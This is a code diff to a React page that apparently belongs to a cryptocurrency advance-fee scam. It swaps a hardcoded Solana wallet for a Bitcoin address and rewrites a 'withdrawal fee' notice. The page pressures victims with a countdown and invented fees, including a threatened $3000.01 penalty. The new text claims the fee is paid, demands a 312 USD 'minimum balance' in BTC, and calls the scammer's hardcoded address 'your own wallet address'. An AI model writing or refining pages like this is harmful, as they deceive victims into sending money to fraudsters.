@@ -14,7 +14,7 @@ export default function Page() {
   const LIMIT_SECONDS = 22 * 60 * 60;
 
   const walletAddress =
-    "Dn5T35muNSyC7CfuyvxR2DX7Y3hTBL5SKWqd5DncvcTW";
+    "bc1p3s8um5am0svmppnkqe73wqh3u2r0se6h9rfqkh2jmgd9wr6njchqvc9cu0";
 
   const [timeLeft, setTimeLeft] = useState(LIMIT_SECONDS);
   const [copied, setCopied] = useState(false);
@@ -208,18 +208,37 @@ export default function Page() {
                   Withdrawal Request
                 </h4>
 
-                <h4 className="text-xl font-bold text-[#b89cff]">
-  Current Withdrawal Fee
-</h4>
+<div className="mt-4 rounded-3xl border border-green-500/20 bg-green-500/10 p-5">
+  <div className="flex items-center gap-3">
+    <div className="flex h-11 w-11 items-center justify-center rounded-full bg-green-500 text-black font-black text-xl">
+      ✓
+    </div>
 
-<p className="text-5xl font-black mt-2 text-white">
-  $300.01
-</p>
+    <div>
+      <p className="text-green-400 font-bold text-lg tracking-wide uppercase">
+        Withdrawal Fee Paid
+      </p>
 
-<p className="text-sm text-neutral-400 mt-3 leading-relaxed">
-  Complete this withdrawal before the timer expires. Failure to do so
-  will result in the full $3000.01 withdrawal processing fee becoming due.
-</p>
+      <p className="text-4xl font-black text-white">
+        $300 USD
+      </p>
+    </div>
+  </div>
+
+  <div className="mt-4 border-t border-white/10 pt-4">
+    <p className="text-white font-semibold">
+      Your funds are available for withdrawal.
+    </p>
+
+    <p className="mt-2 text-sm text-neutral-400 leading-relaxed">
+      To enable transfer processing, please maintain a minimum balance of
+      <span className="text-[#b89cff] font-bold"> 312 USD in BTC </span>
+      in your wallet.
+    </p>
+  </div>
+</div>
+
+
                 <div
                   className={`mt-4 text-3xl font-bold tracking-wider ${
                     timeLeft < 3600
@@ -232,7 +251,7 @@ export default function Page() {
 
                 <div className="mt-5">
                   <p className="text-sm text-neutral-400 mb-2">
-                    Pay the fee in SOL to this wallet address:
+                    Add BTC balance to your own wallet address:
                   </p>
 
                   <div className="bg-neutral-900 rounded-2xl p-4">
